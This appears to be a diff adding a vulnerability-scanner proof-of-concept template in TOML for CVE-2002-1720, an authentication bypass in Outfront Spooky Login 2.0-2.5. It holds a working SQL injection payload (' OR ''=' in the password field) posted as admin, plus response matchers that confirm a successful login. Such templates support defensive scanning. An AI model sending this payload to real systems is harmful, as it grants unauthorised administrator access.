@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "验证 Outfront Spooky Login 2.0-2.5 登录接口是否存在 SQL 注入漏洞。通过在密码字段注入 SQL 语句 ' OR ''=' 绕过身份认证，无需知道真实密码即可以 admin 身份登录。"
+id = "POC-AVE-2002-0665"
+name = "Outfront Spooky Login SQL Injection Authentication Bypass PoC"
+severity = "high"
+tags = ["ave-2002-0665"]
+vuln_id = [
+    "CVE-2002-1720",
+    "AVE-2002-0665",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=%27%20OR%20''%3D%27"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Spooky",
+    "admin",
+    "login",
+    "welcome",
+    "protected",
+]
